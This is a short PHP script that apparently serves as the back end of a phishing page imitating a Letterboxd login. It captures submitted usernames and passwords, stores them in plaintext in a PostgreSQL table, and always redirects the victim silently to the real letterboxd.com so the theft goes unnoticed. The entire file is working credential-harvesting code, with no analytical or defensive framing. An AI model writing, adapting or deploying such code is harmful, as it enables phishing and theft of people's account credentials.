<?php
// -----------------------------
// 1. Read environment variables
// -----------------------------
$host     = getenv("DB_HOST");
$port     = getenv("DB_PORT");
$dbname   = getenv("DB_NAME");
$user     = getenv("DB_USER");
$password = getenv("DB_PASSWORD");

// ---------------------------------------
// 2. Connect to PostgreSQL using PDO
// ---------------------------------------
try {
    $dsn = "pgsql:host=$host;port=$port;dbname=$dbname;";
    $pdo = new PDO($dsn, $user, $password, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (PDOException $e) {
    // Fail silently but still redirect
    header("Location: https://letterboxd.com/");
    exit();
}

// ---------------------------------------
// 3. Get data from POST
// ---------------------------------------
$username = $_POST['username'] ?? '';
$rawPassword = $_POST['password'] ?? '';

// Even if missing, still redirect with no output
if (empty($username) || empty($rawPassword)) {
    header("Location: https://letterboxd.com/");
    exit();
}

// ---------------------------------------
// 5. Insert into database
// ---------------------------------------
try {
    $stmt = $pdo->prepare("
        INSERT INTO users (username, password)
        VALUES (:username, :password)
    ");

    $stmt->bindParam(":username", $username);
    $stmt->bindParam(":password", $rawPassword);

    $stmt->execute();
} catch (PDOException $e) {
    // Even on error, redirect silently
    header("Location: https://letterboxd.com/");
    exit();
}

// ---------------------------------------
// 6. Redirect with NO output
// ---------------------------------------
header("Location: https://letterboxd.com/");
exit();
?>
